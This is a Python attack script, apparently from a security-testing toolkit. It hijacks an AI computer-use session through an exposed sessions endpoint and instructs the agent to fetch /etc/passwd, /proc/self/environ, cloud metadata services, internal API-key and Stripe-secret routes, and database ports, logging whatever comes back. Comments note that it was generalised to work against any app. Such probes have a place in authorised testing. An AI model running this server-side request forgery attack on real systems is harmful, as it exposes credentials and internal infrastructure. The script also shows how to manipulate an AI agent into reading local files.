import sys, os, argparse, urllib.request, urllib.error, urllib.parse, json

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

# FIX: removed hardcoded port 3456 from HTTP targets.
# Port is now derived from the target URL at runtime so the tool is useful
# against any app, not just the VibeHacking testapp.
# file:// URIs are separated into their own list because urllib cannot POST to
# file:// — it raises ValueError, crashing the whole probe loop silently.

FILE_SSRF_TARGETS = [
    "file:///etc/passwd",
    "file:///proc/self/environ",
    "file:///etc/hosts",
]


def _build_http_targets(port):
    """Build internal HTTP SSRF targets using the discovered or default app port."""
    return [
        f"http://127.0.0.1:{port}/api/key",
        f"http://127.0.0.1:{port}/api/config",
        f"http://localhost:{port}/api/stripe/secret",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",   # AWS IMDS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://127.0.0.1:5432",   # Postgres
        "http://127.0.0.1:6379",   # Redis
        "http://127.0.0.1:27017",  # MongoDB
    ]


class SSRFProbe(VibeTool):
    def __init__(self):
        super().__init__("SSRF Probe", "Server-Side Request Forgery via Computer-Use Sessions")

    def _probe_file_targets(self, base, session_id):
        """
        FIX: file:// URIs cannot be sent via urllib HTTP POST — separate them and
        use the computer-use instruct endpoint (which the AI navigates, not urllib).
        Falls back gracefully if the endpoint is absent.
        """
        hits = 0
        for target in FILE_SSRF_TARGETS:
            payload = json.dumps({
                "sessionId": session_id,
                "instruction": f"navigate to {target} and return the page content",
            }).encode()
            req = urllib.request.Request(base + "/api/computer/instruct", data=payload, method="POST")
            req.add_header("Content-Type", "application/json")
            try:
                r = urllib.request.urlopen(req, timeout=6)
                resp = r.read().decode()
                if "error" not in resp.lower() and len(resp) > 50:
                    self.log(f"[FILE SSRF HIT] {target} => {resp[:120]}", "fail")
                    hits += 1
                else:
                    self.log(f"[blocked/error] {target} => {resp[:80]}")
            except urllib.error.HTTPError as e:
                self.log(f"[{e.code}] {target}")
            except Exception as ex:
                self.log(f"[ERR] {target}: {str(ex)[:50]}")
        return hits

    def run(self, url):
        self.banner()
        base = url.rstrip("/")

        # FIX: derive port from --url instead of hardcoding 3456
        parsed = urllib.parse.urlparse(url)
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        http_targets = _build_http_targets(port)

        sessions_url = base + "/api/computer/sessions"
        self.log("Step 1 — Fetching active sessions...")
        try:
            r = urllib.request.urlopen(sessions_url, timeout=5)
            data = json.loads(r.read().decode())
            sessions = data.get("sessions", [])
            self.log(f"Found {len(sessions)} active session(s)")
        except Exception as ex:
            self.log(f"Could not fetch sessions: {ex}", "warn")
            sessions = []

        session_id = sessions[0]["sessionId"] if sessions else "test123"
        self.log(f"Using sessionId: {session_id}")

        self.log("Step 2 — Probing HTTP SSRF targets via /api/computer/instruct...")
        hits = 0
        for target in http_targets:
            payload = json.dumps({
                "sessionId": session_id,
                "instruction": f"navigate to {target} and return the page content",
            }).encode()
            req = urllib.request.Request(base + "/api/computer/instruct", data=payload, method="POST")
            req.add_header("Content-Type", "application/json")
            try:
                r = urllib.request.urlopen(req, timeout=6)
                resp = r.read().decode()
                if "error" not in resp.lower() and len(resp) > 100:
                    self.log(f"[SSRF HIT] {target} => {resp[:120]}", "fail")
                    hits += 1
                else:
                    self.log(f"[blocked/error] {target} => {resp[:80]}")
            except urllib.error.HTTPError as e:
                self.log(f"[{e.code}] {target}")
            except Exception as ex:
                self.log(f"[ERR] {target}: {str(ex)[:50]}")

        self.log("Step 3 — Probing file:// targets via computer-use (separate path — cannot urllib POST to file://)...")
        hits += self._probe_file_targets(base, session_id)

        if hits:
            self.log(f"CRITICAL — {hits} SSRF vector(s) confirmed.", "fail")
        else:
            self.log("No direct SSRF confirmed via instruct endpoint.", "pass")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--version', action='version', version='SSRF Probe 1.0.0')
    parser.add_argument("--url", required=True, help="Target URL (e.g. http://localhost:3456)")
    args = parser.parse_args()
    SSRFProbe().run(args.url)
